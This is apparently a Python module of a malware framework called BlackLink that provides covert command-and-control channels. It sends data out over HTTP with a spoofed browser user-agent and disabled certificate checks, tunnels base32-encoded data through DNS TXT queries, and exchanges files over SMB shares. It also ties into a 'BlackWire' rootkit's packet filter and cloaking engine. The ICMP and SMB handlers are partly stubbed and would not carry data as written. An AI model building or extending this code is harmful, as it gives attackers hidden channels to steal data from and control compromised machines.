"""
Protocol Handlers for BlackLink
Provides specialized handlers for various communication protocols
"""

import os
import sys
import time
import random
import socket
import platform
import base64
import json
import logging
import zlib
import hashlib
import uuid
import struct
import tempfile
import subprocess
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple, Union, Callable, Iterable

# Try to import optional dependencies
try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

try:
    import dns.resolver
    HAVE_DNSPYTHON = True
except ImportError:
    HAVE_DNSPYTHON = False

class HTTPHandler:
    """HTTP/HTTPS protocol handler"""
    
    @staticmethod
    def send(data: bytes, target: str, is_https: bool = False, **kwargs) -> bytes:
        """Send data over HTTP/HTTPS
        
        Args:
            data: Data to send
            target: Target URL
            is_https: Whether to use HTTPS
            **kwargs: Additional parameters
            
        Returns:
            Response data
        """
        if HAVE_REQUESTS:
            return HTTPHandler._send_with_requests(data, target, is_https, **kwargs)
        else:
            return HTTPHandler._send_with_socket(data, target, is_https, **kwargs)
    
    @staticmethod
    def _send_with_requests(data: bytes, target: str, is_https: bool, **kwargs) -> bytes:
        """Send data using requests library"""
        try:
            # Ensure URL has proper prefix
            prefix = "https://" if is_https else "http://"
            if not target.startswith(prefix):
                target = prefix + target
            
            # Extract parameters
            method = kwargs.get("method", "POST")
            headers = kwargs.get("headers", {})
            verify = kwargs.get("verify", False)
            timeout = kwargs.get("timeout", 30)
            
            # Default headers if not provided
            if not headers:
                headers = {
                    "User-Agent": kwargs.get("user_agent", 
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive"
                }
            
            # Make request
            if method.upper() == "GET":
                response = requests.get(
                    target, 
                    params={"d": base64.urlsafe_b64encode(data).decode('ascii')},
                    headers=headers,
                    verify=verify,
                    timeout=timeout
                )
            else:  # POST
                response = requests.post(
                    target,
                    data=data,
                    headers=headers,
                    verify=verify,
                    timeout=timeout
                )
            
            # Return response content
            return response.content
            
        except Exception as e:
            logging.error(f"HTTP/HTTPS error: {e}")
            return b''
    
    @staticmethod
    def _send_with_socket(data: bytes, target: str, is_https: bool, **kwargs) -> bytes:
        """Send data using raw sockets"""
        if is_https:
            # Can't do HTTPS with simple sockets, need SSL context
            logging.error("HTTPS not supported without requests library")
            return b''
            
        try:
            # Parse URL
            if target.startswith("http://"):
                target = target[7:]
            
            if "/" in target:
                host_port, path = target.split("/", 1)
                path = "/" + path
            else:
                host_port = target
                path = "/"
            
            if ":" in host_port:
                host, port_str = host_port.split(":")
                port = int(port_str)
            else:
                host = host_port
                port = 80
            
            # Method
            method = kwargs.get("method", "POST")
            
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            
            # Prepare request
            if method.upper() == "GET":
                encoded_data = base64.urlsafe_b64encode(data).decode('ascii')
                request = f"GET {path}?d={encoded_data} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: close\r\n\r\n"
                request = request.encode('ascii')
            else:  # POST
                request = f"POST {path} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                request += "Accept: */*\r\n"
                request += f"Content-Length: {len(data)}\r\n"
                request += "Connection: close\r\n\r\n"
                request = request.encode('ascii') + data
            
            # Send request
            s.sendall(request)
            
            # Receive response
            response = b''
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            s.close()
            
            # Extract response body
            if b"\r\n\r\n" in response:
                return response.split(b"\r\n\r\n", 1)[1]
            
            return response
            
        except Exception as e:
            logging.error(f"HTTP socket error: {e}")
            return b''


class DNSHandler:
    """DNS protocol handler"""
    
    @staticmethod
    def send(data: bytes, target: str, **kwargs) -> bytes:
        """Send data over DNS
        
        Args:
            data: Data to send
            target: Target DNS server
            **kwargs: Additional parameters
            
        Returns:
            Response data
        """
        if HAVE_DNSPYTHON:
            return DNSHandler._send_with_dnspython(data, target, **kwargs)
        else:
            return DNSHandler._send_with_socket(data, target, **kwargs)
            
    @staticmethod
    def _send_with_dnspython(data: bytes, target: str, **kwargs) -> bytes:
        """Send data using dnspython library"""
        try:
            # Convert data to DNS suitable format (base32, lowercase)
            encoded = base64.b32encode(data).decode('ascii').lower()
            
            # Split into DNS label-sized chunks (max 63 chars per label)
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            
            # Append domain
            domain = kwargs.get("domain", "example.com")
            query = ".".join(chunks + [domain])
            
            # Perform query
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [target]
            resolver.timeout = 5
            resolver.lifetime = 5
            
            query_type = kwargs.get("query_type", "TXT")
            answers = resolver.resolve(query, query_type)
            
            # Extract and return response
            response_data = b''
            for answer in answers:
                if query_type == "TXT":
                    txt_data = str(answer).strip('"')
                    try:
                        response_data += base64.b32decode(txt_data.upper())
                    except:
                        pass
                else:
                    # Extract embedded data from response (implementation dependent)
                    pass
            
            return response_data
            
        except Exception as e:
            logging.error(f"DNS error: {e}")
            return b''
    
    @staticmethod
    def _send_with_socket(data: bytes, target: str, **kwargs) -> bytes:
        """Send data using raw sockets"""
        try:
            # Simplified DNS query construction
            domain = kwargs.get("domain", "example.com")
            
            # Convert data to DNS suitable format
            encoded = base64.b32encode(data).decode('ascii').lower()
            
            # Split into DNS label-sized chunks (max 63 chars per label)
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            
            # Limit query length
            max_chunks = 3  # Arbitrary limit to prevent excessive length
            if len(chunks) > max_chunks:
                chunks = chunks[:max_chunks]
            
            # Create query domain
            query = ".".join(chunks + [domain])
            
            # Build simple DNS query packet
            transaction_id = random.randint(0, 65535).to_bytes(2, byteorder='big')
            flags = (0x0100).to_bytes(2, byteorder='big')  # Standard query
            qdcount = (1).to_bytes(2, byteorder='big')  # One question
            ancount = (0).to_bytes(2, byteorder='big')  # No answers
            nscount = (0).to_bytes(2, byteorder='big')  # No authority records
            arcount = (0).to_bytes(2, byteorder='big')  # No additional records
            
            # Encode domain name
            qname = b''
            for label in query.split('.'):
                qname += len(label).to_bytes(1, byteorder='big')
                qname += label.encode('ascii')
            qname += (0).to_bytes(1, byteorder='big')  # Terminating byte
            
            qtype = (16).to_bytes(2, byteorder='big')  # TXT record
            qclass = (1).to_bytes(2, byteorder='big')  # IN class
            
            # Assemble packet
            packet = transaction_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
            
            # Send query
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(packet, (target, 53))
            
            # Receive response
            response, _ = sock.recvfrom(4096)
            sock.close()
            
            # Extract response (simplified parsing)
            if len(response) > 12:  # DNS header is 12 bytes
                return response[12:]
            
            return b''
            
        except Exception as e:
            logging.error(f"DNS socket error: {e}")
            return b''


class ICMPHandler:
    """ICMP protocol handler"""
    
    @staticmethod
    def send(data: bytes, target: str, **kwargs) -> bytes:
        """Send data over ICMP
        
        Args:
            data: Data to send
            target: Target host
            **kwargs: Additional parameters
            
        Returns:
            Response data
        """
        system = platform.system().lower()
        
        if system == "windows":
            return ICMPHandler._send_windows(data, target, **kwargs)
        else:
            return ICMPHandler._send_unix(data, target, **kwargs)
    
    @staticmethod
    def _send_windows(data: bytes, target: str, **kwargs) -> bytes:
        """Send data on Windows"""
        try:
            # Create a temporary file for the data (data embedded in ping)
            with tempfile.NamedTemporaryFile(delete=False) as f:
                # Limit data size for ping payload
                f.write(data[:128])
                temp_file = f.name
            
            # Use ping to send the data
            result = subprocess.run(
                ["ping", "-n", "1", "-l", "56", target],
                capture_output=True,
                check=False
            )
            
            # Clean up
            os.unlink(temp_file)
            
            return result.stdout
            
        except Exception as e:
            logging.error(f"ICMP Windows error: {e}")
            return b''
    
    @staticmethod
    def _send_unix(data: bytes, target: str, **kwargs) -> bytes:
        """Send data on Unix-like systems"""
        try:
            # Use ping for data transmission
            result = subprocess.run(
                ["ping", "-c", "1", "-s", "56", target],
                capture_output=True,
                check=False
            )
            
            return result.stdout
            
        except Exception as e:
            logging.error(f"ICMP Unix error: {e}")
            return b''


class SMBHandler:
    """SMB protocol handler"""
    
    @staticmethod
    def send(data: bytes, target: str, **kwargs) -> bytes:
        """Send data over SMB
        
        Args:
            data: Data to send
            target: Target SMB share (e.g. "\\\\server\\share")
            **kwargs: Additional parameters
            
        Returns:
            Response data
        """
        try:
            # Extract parameters
            username = kwargs.get("username", "")
            password = kwargs.get("password", "")
            domain = kwargs.get("domain", "")
            share = kwargs.get("share", "IPC$")
            
            # Create unique filenames
            write_file = f"BL_{uuid.uuid4().hex}.dat"
            read_file = f"BL_{uuid.uuid4().hex}.rsp"
            
            # Clean target path format
            if not target.startswith("\\\\"):
                target = f"\\\\{target}"
                
            if not target.endswith("\\"):
                target += "\\"
                
            # Full paths
            write_path = f"{target}{share}\\{write_file}"
            read_path = f"{target}{share}\\{read_file}"
            
            # Basic implementation using local file operations
            # In real implementation, SMB client library would be used
            with open(write_path, "wb") as f:
                f.write(data)
                
            # Wait for response
            response = b''
            timeout = time.time() + 30  # 30 second timeout
            
            while time.time() < timeout:
                time.sleep(1)
                try:
                    if os.path.exists(read_path):
                        with open(read_path, "rb") as f:
                            response = f.read()
                        
                        # Try to delete the response file
                        try:
                            os.unlink(read_path)
                        except:
                            pass
                            
                        break
                except:
                    pass
            
            # Try to delete our write file
            try:
                os.unlink(write_path)
            except:
                pass
                
            return response
            
        except Exception as e:
            logging.error(f"SMB error: {e}")
            return b''


class ProtocolManager:
    """Manages multiple communication protocols"""
    
    def __init__(self, config: Dict[str, Any] = None):
        """Initialize protocol manager
        
        Args:
            config: Protocol configuration
        """
        self.config = config or {}
        
        # Register protocol handlers
        self.handlers = {
            "http": HTTPHandler.send,
            "https": lambda data, target, **kwargs: HTTPHandler.send(data, target, True, **kwargs),
            "dns": DNSHandler.send,
            "icmp": ICMPHandler.send,
            "smb": SMBHandler.send
        }
        
    def send(self, protocol: str, data: bytes, target: str, **kwargs) -> bytes:
        """Send data using specified protocol
        
        Args:
            protocol: Protocol to use
            data: Data to send
            target: Target address
            **kwargs: Additional protocol-specific parameters
            
        Returns:
            Response data
        """
        # Check if protocol is supported
        if protocol not in self.handlers:
            raise ValueError(f"Unsupported protocol: {protocol}")
            
        # Add protocol-specific config
        protocol_config = self.config.get(protocol, {})
        merged_kwargs = {**protocol_config, **kwargs}
        
        # Call appropriate handler
        return self.handlers[protocol](data, target, **merged_kwargs)
    
    def setup_blackwire_integration(self, blackwire_module):
        """Setup integration with BlackWire module
        
        Args:
            blackwire_module: BlackWire module instance
        """
        # Connect to BlackWire's cloaking engine if available
        if hasattr(blackwire_module, 'cloaking_engine'):
            self.cloaking_engine = blackwire_module.cloaking_engine
            
        # Connect to BlackWire's packet filter if available
        if hasattr(blackwire_module, 'rootkit') and hasattr(blackwire_module.rootkit, 'packet_filter'):
            self.packet_filter = blackwire_module.rootkit.packet_filter
            
            # Add protocol specific handlers to packet filter
            if hasattr(self.packet_filter, 'add_handler'):
                # Setup protocol handlers
                for protocol, handler in self.handlers.items():
                    if protocol in ['http', 'https']:
                        self.packet_filter.add_handler('tcp', self._create_filter_handler(protocol))
                    else:
                        self.packet_filter.add_handler(protocol, self._create_filter_handler(protocol))
    
    def _create_filter_handler(self, protocol):
        """Create a handler function for packet filter
        
        Args:
            protocol: Protocol name
            
        Returns:
            Handler function
        """
        def handler(packet):
            # This is a simplified handler that would analyze packets
            # and possibly extract C2 communications
            return False  # No modification by default
        
        return handler
